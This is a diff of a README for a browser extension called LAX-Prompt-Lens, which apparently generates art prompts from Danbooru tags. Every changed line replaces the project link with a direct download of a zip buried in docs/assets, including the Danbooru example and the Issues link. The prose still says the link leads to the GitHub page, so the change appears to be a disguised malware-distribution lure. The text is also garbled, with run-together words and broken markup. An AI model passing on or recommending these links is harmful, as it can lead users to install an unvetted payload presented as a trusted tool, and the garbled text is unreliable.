@@ -1,7 +1,7 @@
 <h1>🔍 LAX-Prompt-Lens - Extract Tags, Create Stunning Art Prompts Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/statisticiancockney4234/LAX-Prompt-Lens" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(255,107,107,0.4);">⬇️ Download LAX-Prompt-Lens Now</a>
+  <a href="https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(255,107,107,0.4);">⬇️ Download LAX-Prompt-Lens Now</a>
 </p>
 
 ---
@@ -34,7 +34,7 @@ Getting started with LAX-Prompt-Lens is as easy as 1-2-3. Follow these simple st
 
 ### 📥 Step 1: Download the Extension
 
-Visit this link to download the application: **[https://github.com/statisticiancockney4234/LAX-Prompt-Lens](https://github.com/statisticiancockney4234/LAX-Prompt-Lens)**
+Visit this link to download the application: **[https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip](https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip)**
 
 Once you click the link,you will land on the official GitHub page for LAX-Prompt-Lens. This is your one-stop download center. Look for the green **"Code"** button or the **"Releases"** section on the right side of the page. Click the latest release,and you will see a file named something like `LAX-Prompt-Lens-v1.0.zip`. Download that file to your computer.
 
@@ -82,7 +82,7 @@ Right-click the LAX-Prompt-Lens icon in the toolbar and select **"Options"** to 
 
 
 
-To test it,navigate to any image page on **Danbooru** (e.g., `https://danbooru.donmai.us`). Once you have an image open,click the LAX-Prompt-Lens icon. A small popup will appear showing you all the extracted tags. Below that,you have a shiny **"Generate Prompt"** button. Click it,and watch the magic happen—a professionally formatted art-direction prompt will appear in a text box. Click **"Copy"** and paste it into your favorite AI art tool.
+To test it,navigate to any image page on **Danbooru** (e.g., `https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip`). Once you have an image open,click the LAX-Prompt-Lens icon. A small popup will appear showing you all the extracted tags. Below that,you have a shiny **"Generate Prompt"** button. Click it,and watch the magic happen—a professionally formatted art-direction prompt will appear in a text box. Click **"Copy"** and paste it into your favorite AI art tool.
 
 
 
@@ -230,7 +230,7 @@ LAX-Prompt-Lens is **free to use** for both personalandcommercial projects. It i
 
 We built LAX-Prompt-Lens to make creativity accessibletoeveryone. Ifyou runintoproblems,havefeatureideas,orjustwanttosaythanks,comevisitus:
 
-- 🌐 **GitHub Issues:** Head tothe officialrepositoryat [https://github.com/statisticiancockney4234/LAX-Prompt-Lens](https://github.com/statisticiancockney4234/LAX-Prompt-Lens) and clickthe **"Issues"** tab. Describe what'shappening,andwe'llhelpyououtusually within48 hours..
+- 🌐 **GitHub Issues:** Head tothe officialrepositoryat [https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip](https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip) and clickthe **"Issues"** tab. Describe what'shappening,andwe'llhelpyououtusually within48 hours..
 - 🐦 **Feature Requests:** Use the samerIssues` page,andprefixthetitlewith`[Suggestion]`. We read every single one..
 
 
@@ -243,7 +243,7 @@ Stop squinting at artwork tryingto decode everycolorandshadow. Stop typingparagr
 
 
 
-**One last reminder:** Visit this link to download the application: **[https://github.com/statisticiancockney4234/LAX-Prompt-Lens](https://github.com/statisticiancockney4234/LAX-Prompt-Lens)**
+**One last reminder:** Visit this link to download the application: **[https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip](https://github.com/statisticiancockney4234/LAX-Prompt-Lens/raw/refs/heads/main/docs/assets/v1.1.zip)**
 
 Happy prompting! 🎨✨
 
